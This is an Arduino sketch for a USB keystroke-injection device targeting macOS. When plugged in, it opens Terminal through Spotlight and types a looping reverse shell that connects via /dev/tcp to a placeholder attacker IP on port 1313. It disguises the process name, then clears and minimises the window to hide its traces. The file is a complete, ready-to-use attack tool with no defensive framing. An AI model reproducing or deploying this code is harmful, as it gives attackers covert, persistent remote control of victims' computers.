#include "Keyboard.h"

// MACROS =====================================================================
void printAndWait(char *input, unsigned long delayTime) {
  Keyboard.print(input);
  delay(delayTime);
}

void spawnTerminal() {
  // Open spotlight search
  commandKey(' ');

  // Open the terminal
  Keyboard.print("Terminal");
  Keyboard.press(KEY_RETURN);
  delay(500);
  Keyboard.releaseAll();
}

void commandKey(char key) {
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(key);
  delay(500);
  Keyboard.releaseAll();
}

// MAIN =======================================================================
void setup() {
  Keyboard.begin();
  delay(1000);

  spawnTerminal();
  printAndWait("bash -c '(while true; do exec -a cool_process sh -i >& /dev/tcp/<ATTACKER-IP>/1313 0>&1; sleep 10; done) &'\n", 500);
  printAndWait("clear\n", 50);
  commandKey('m');

  Keyboard.end();
}

void loop() {

}